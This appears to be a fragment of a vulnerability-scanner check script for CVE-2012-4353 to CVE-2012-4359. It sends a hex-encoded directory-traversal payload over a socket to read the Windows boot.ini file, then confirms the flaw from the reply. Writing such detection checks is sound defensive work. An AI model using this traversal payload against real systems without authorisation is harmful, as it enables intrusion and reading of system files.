if(description){
	...
	script_cve_id( "CVE-2012-4353", "CVE-2012-4354", "CVE-2012-4355", "CVE-2012-4356", "CVE-2012-4357", "CVE-2012-4358", "CVE-2012-4359" );
...
payload = raw_string( crap( data: raw_string( 0x00 ), length: 20 ), 0x78, 0x2e, 0x2e, 0x2f, 0x2e, 0x2e, 0x2f, 0x2e, 0x2e, 0x2f, 0x2e, 0x2e, 0x2f, 0x2e, 0x2e, 0x2f, 0x2e, 0x2e, 0x2f, 0x2e, 0x2e, 0x2f, 0x2e, 0x2e, 0x2f, 0x2e, 0x2e, 0x2f, 0x2e, 0x2e, 0x2f, 0x62, 0x6f, 0x6f, 0x74, 0x2e, 0x69, 0x6e, 0x69, 0x00, 0x00, 0x00, 0x00, 0x00 );
send( socket: soc, data: payload );
res = recv( socket: soc, length: 200 );
if(!res || !IsMatchRegexp( hexstr( res ), "^78" )){
	close( soc );
	exit( 0 );
}
readData = raw_string( crap( data: raw_string( 0x00 ), length: 20 ), 0x98, crap( data: raw_string( 0x00 ), length: 10 ) );
send( socket: soc, data: readData );
res = recv( socket: soc, length: 200 );
close( soc );
if(res && ContainsString( res, "[boot loader]" ) && ContainsString( res, "WINDOWS" )){
